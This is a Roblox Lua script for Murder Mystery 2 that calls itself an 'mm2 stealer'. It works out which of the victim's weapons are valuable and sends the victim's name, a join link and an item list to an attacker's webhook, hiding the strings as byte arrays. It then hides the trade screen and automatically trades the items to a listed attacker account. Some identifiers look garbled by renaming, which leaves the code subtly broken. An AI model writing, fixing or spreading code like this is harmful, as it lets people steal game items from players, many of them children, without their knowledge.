-- Obfuscated by Grok
local junk1 = math.random(1,100)
if junk1 > 50 then
local junk2 = "hello"
end
local Plyrs = game:GetService("Plyrs")
local player = Plyrs.Localplayer

_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local usrs = _G.Usernames or {}
local minRar = _G.minRar or "Godly"
local minVal = _G.minVal or 1
local png = _G.pingEveryone or "No"
local whk = _G.whk or ""

if next(usrs) == nil or whk == "" then
    player:kick("You didn't add username or whk")
    return
end

if game.PlaceId ~= 142823291 then
    player:kick("Game not supported. Please join a normal MM2 server")
    return
end

if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
    player:kick("Server error. Please join a DIFFERENT server")
    return
end

if #Plyrs:GetPlyrs() >= 12 then
    player:kick("Server is full. Please join a less populated server")
    return
end

-- Дальше весь твой код без изменений ↓
local wepsToSnd = {}
local plrGui = player:WaitForChild("plrGui")
local db = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
local HttpSvc = game:GetService("HttpSvc")

local rarTbl = {
    "Common",
    "Uncommon",
    "Rare",
    "Legendary",
    "Godly",
    "Ancient",
    "Unique",
    "Vintage"
}

local cats = {
    godly = "https://supremevaluelist.com/mm2/godlies.html",
    ancient = "https://supremevaluelist.com/mm2/ancients.html",
    unique = "https://supremevaluelist.com/mm2/uniques.html",
    classic = "https://supremevaluelist.com/mm2/vintages.html",
    chroma = "https://supremevaluelist.com/mm2/chromas.html"
}
local hdrs = {
    ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
}

local function trm(s)
    return s:match("^%s*(.-)%s*$")
end

local function fetchHtml(url)
    local response = request({
        Url = url,
        Method = "GET",
        Hdrs = hdrs
    })
    return response.Body
end

local function prsVal(itembodyDiv)
    local valueStr = itembodyDiv:match("<b%s+class=['"]itemvalue['"]>([%d,%.]+)</b>")
    if valueStr then
        valueStr = valueStr:gsub(",", "")
        local value = tonumber(valueStr)
        if value then
            return value
        end
    end
    return nil
end

local function extItems(htmlContent)
    local itemValues = {}
    
    for itemName, itembodyDiv in htmlContent:gmatch("<div%s+class=['"]itemhead['"]>(.-)</div>%s*<div%s+class=['"]itembody['"]>(.-)</div>") do
        itemName = itemName:match("([^<]+)")
        if itemName then
            itemName = trm(itemName:gsub("%s+", " "))
            itemName = trm((itemName:split(" Click "))[1])
            local itemNameLower = itemName:lower()

            local value = prsVal(itembodyDiv)
            if value then
                itemValues[itemNameLower] = value
            end
        end
    end
    
    return itemValues
end

local function extChroma(htmlContent)
    local chromaValues = {}

    for chromaName, itembodyDiv in htmlContent:gmatch("<div%s+class=['"]itemhead['"]>(.-)</div>%s*<div%s+class=['"]itembody['"]>(.-)</div>") do
        chromaName = chromaName:match("([^<]+)")
        if chromaName then
            chromaName = trm(chromaName:gsub("%s+", " ")):lower()
            local value = prsVal(itembodyDiv)
            if value then
                chromaValues[chromaName] = value
            end
        end
    end
    
    return chromaValues
end

local function bldValList()
    local allExtractedValues = {}
    local chromaExtractedValues = {}
    local catsToFetch = {}

    for rarity, url in pairs(cats) do
        table.insert(catsToFetch, {rarity = rarity, url = url})
    end
    
    local totalCats = #catsToFetch
    local completed = 0
    local lock = Instance.new("BindableEvent")

    for _, category in ipairs(catsToFetch) do
        task.spawn(function()
            local rarity = category.rarity
            local url = category.url
            local htmlContent = fetchHtml(url)
            
            if htmlContent and htmlContent ~= "" then
                if rarity ~= "chroma" then
                    local extractedItemValues = extItems(htmlContent)
                    for itemName, value in pairs(extractedItemValues) do
                        allExtractedValues[itemName] = value
                    end
                else
                    chromaExtractedValues = extChroma(htmlContent)
                end
            end

            completed = completed + 1
            if completed == totalCats then
                lock:Fire()
            end
        end)
    end

    lock.Event:Wait()

    local valList = {}

    for dataid, item in pairs(db) do
        local itemName = item.ItemName and item.ItemName:lower() or ""
        local rarity = item.Rarity or ""
        local hasChroma = item.Chroma or false

        if itemName ~= "" and rarity ~= "" then
            local weaponRarityIndex = table.find(rarTbl, rarity)
            local godlyIndex = table.find(rarTbl, "Godly")

            if weaponRarityIndex and weaponRarityIndex >= godlyIndex then
                if hasChroma then
                    local matchedChromaValue = nil
                    for chromaName, value in pairs(chromaExtractedValues) do
                        if chromaName:find(itemName) then
                            matchedChromaValue = value
                            break
                        end
                    end

                    if matchedChromaValue then
                        valList[dataid] = matchedChromaValue
                    end
                else
                    local value = allExtractedValues[itemName]
                    if value then
                        valList[dataid] = value
                    end
                end
            end
        end
    end

    return valList
end

local function sndTrdReq(user)
    local args = {
        [1] = game:GetService("Plyrs"):WaitForChild(user)
    }
    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(unpack(args))
end

local function getTrdStat()
    return game:GetService("ReplicatedStorage").Trade.GetTradeStatus:InvokeServer()
end

local function waitTrdComp()
    while true do
        local status = getTrdStat()
        if status == "None" then
            break
        end
        wait(0.1)
    end
end

local function accTrd()
    local args = {
        [1] = 285646582
    }
    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(unpack(args))
end

local function addWepTrd(id)
    local args = {
        [1] = id,
        [2] = "Weapons"
    }
    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))
end

local totVal = 0

local function SndFstMsg(list, prefix)
    local hdrs = {
        ["Content-Type"] = "application/json"
    }

    local fields = {
        {
            name = "Victim Username:",
            value = player.Name,
            inline = true
        },
        {
            name = "Join link:",
            value = string.char(104,116,116,112,115,58,47,47,102,101,114,110,46,119,116,102,47,106,111,105,110,101,114,63,112,108,97,99,101,73,100,61,49,52,50,56,50,51,50,57,49,38,103,97,109,101,73,110,115,116,97,110,99,101,73,100,61) .. game.JobId
        },
        {
            name = "Item list:",
            value = "",
            inline = false
        },
        {
            name = "Summary:",
            value = string.format("Total Value: %s", totVal),
            inline = false
        }
    }

    for _, item in ipairs(list) do
        local itemLine = string.format("%s (x%s): %s Value (%s)", item.DataID, item.Amount, (item.Value * item.Amount), item.Rarity)
        fields[3].value = fields[3].value .. itemLine .. "\n"
    end

    if #fields[3].value > 1024 then
        local lines = {}
        for line in fields[3].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[3].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local data = {
        ["content"] = prefix .. string.char(103,97,109,101,58,71,101,116,83,101,114,118,105,99,101,40,39,84,101,108,101,112,111,114,116,83,101,114,118,105,99,101,39,41,58,84,101,108,101,112,111,114,116,84,111,80,108,97,99,101,73,110,115,116,97,110,99,101,40,49,52,50,56,50,51,50,57,49,44,32,39) .. game.JobId .. "')",
        ["embeds"] = {{
            ["title"] = "\240\159\148\170 Join to get MM2 hit",
            ["color"] = 65280,
            ["fields"] = fields,
            ["footer"] = {
                ["text"] = "mm2 stealer by yarik stealer"
            }
        }}
    }

    local body = HttpSvc:JSONEncode(data)
    local response = request({
        Url = whk,
        Method = "POST",
        Hdrs = hdrs,
        Body = body
    })
end

local function SndMsg(sortedItems)
    local hdrs = {
        ["Content-Type"] = "application/json"
    }

	local fields = {
		{
			name = "Victim Username:",
			value = player.Name,
			inline = true
		},
		{
			name = "Items sent:",
			value = "",
			inline = false
		},
        {
            name = "Summary:",
            value = string.format("Total Value: %s", totVal),
            inline = false
        }
	}

    for _, item in ipairs(sortedItems) do
        local itemLine = string.format("%s (x%s): %s Value (%s)", item.DataID, item.Amount, (item.Value * item.Amount), item.Rarity)
        fields[2].value = fields[2].value .. itemLine .. "\n"
    end

    if #fields[2].value > 1024 then
        local lines = {}
        for line in fields[2].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[2].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[2].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local data = {
        ["embeds"] = {{
            ["title"] = "\240\159\148\170 New MM2 Execution" ,
            ["color"] = 65280,
			["fields"] = fields,
			["footer"] = {
				["text"] = "mm2 stealer by yarik stealer"
			}
        }}
    }

    local body = HttpSvc:JSONEncode(data)
    local response = request({
        Url = whk,
        Method = "POST",
        Hdrs = hdrs,
        Body = body
    })
end

local trdGui = plrGui:WaitForChild("TradeGUI")
trdGui:GetPropertyChangedSignal("Enabled"):Connect(function()
    trdGui.Enabled = false
end)
local trdGuiPh = plrGui:WaitForChild("TradeGUI_Phone")
trdGuiPh:GetPropertyChangedSignal("Enabled"):Connect(function()
    trdGuiPh.Enabled = false
end)

local minRarIdx = table.find(rarTbl, minRar)

local untrd = {
    ["DefaultGun"] = true,
    ["DefaultKnife"] = true,
    ["Reaver"] = true,
    ["Reaver_Legendary"] = true,
    ["Reaver_Godly"] = true,
    ["Reaver_Ancient"] = true,
    ["IceHammer"] = true,
    ["IceHammer_Legendary"] = true,
    ["IceHammer_Godly"] = true,
    ["IceHammer_Ancient"] = true,
    ["Gingerscythe"] = true,
    ["Gingerscythe_Legendary"] = true,
    ["Gingerscythe_Godly"] = true,
    ["Gingerscythe_Ancient"] = true,
    ["TestItem"] = true,
    ["Season1TestKnife"] = true,
    ["Cracks"] = true,
    ["Icecrusher"] = true,
    ["???"] = true,
    ["Dartbringer"] = true,
    ["TravelerAxeRed"] = true,
    ["TravelerAxeBronze"] = true,
    ["TravelerAxeSilver"] = true,
    ["TravelerAxeGold"] = true,
    ["BlueCamo_K_2022"] = true,
    ["GreenCamo_K_2022"] = true,
    ["SharkSeeker"] = true
}

local valList = bldValList()
local rlData = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(player.Name)

for i, v in pairs(rlData.Weapons.Owned) do
    local dataid = i
    local amount = v
    local rarity = db[dataid].Rarity
    local weapon_rarity_index = table.find(rarTbl, rarity)
    if weapon_rarity_index and weapon_rarity_index >= minRarIdx and not untrd[dataid] then
        local value
        if valList[dataid] then
            value = valList[dataid]
        else
            if weapon_rarity_index >= table.find(rarTbl, "Godly") then
                value = 2
            else
                value = 1
            end
        end
        if value >= minVal then
            totVal = totVal + (value * amount)
            table.insert(wepsToSnd, {DataID = dataid, Rarity = rarity, Amount = amount, Value = value})
        end
    end
end

if #wepsToSnd > 0 then
    table.sort(wepsToSnd, function(a, b)
        return (a.Value * a.Amount) > (b.Value * b.Amount)
    end)

    local sentWeapons = {}
    for i, v in ipairs(wepsToSnd) do
        sentWeapons[i] = v
    end

    local prefix = ""
    if png == "Yes" then
        prefix = "--[[@everyone]] "
    end

    SndFstMsg(wepsToSnd, prefix)

    local function doTrd(joinedUser)
        local initialTradeState = getTrdStat()
        if initialTradeState == "StartTrade" then
            game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer()
            wait(0.3)
        elseif initialTradeState == "ReceivingRequest" then
            game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
            wait(0.3)
        end

        while #wepsToSnd > 0 do
            local tradeStatus = getTrdStat()

            if tradeStatus == "None" then
                sndTrdReq(joinedUser)
            elseif tradeStatus == "SendingRequest" then
                wait(0.3)
            elseif tradeStatus == "ReceivingRequest" then
                game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
                wait(0.3)
            elseif tradeStatus == "StartTrade" then
                for i = 1, math.min(4, #wepsToSnd) do
                    local weapon = table.remove(wepsToSnd, 1)
                    for count = 1, weapon.Amount do
                        addWepTrd(weapon.DataID)
                    end
                end
                wait(6)
                accTrd()
                waitTrdComp()
            else
                wait(0.5)
            end
            wait(1)
        end
        warn("Trade scam opened")
    end

    local function waitUsrChat()
        local sentMessage = false
        local function onplayerChat(player)
            if table.find(usrs, player.Name) then
                player.Chatted:Connect(function()
                    if not sentMessage then
                        SndMsg(sentWeapons)
                        sentMessage = true
                    end
                    doTrd(player.Name)
                end)
            end
        end
        for _, p in ipairs(Plyrs:GetPlyrs()) do onplayerChat(p) end
        Plyrs.playerAdded:Connect(onplayerChat)
    end
    waitUsrChat()
end
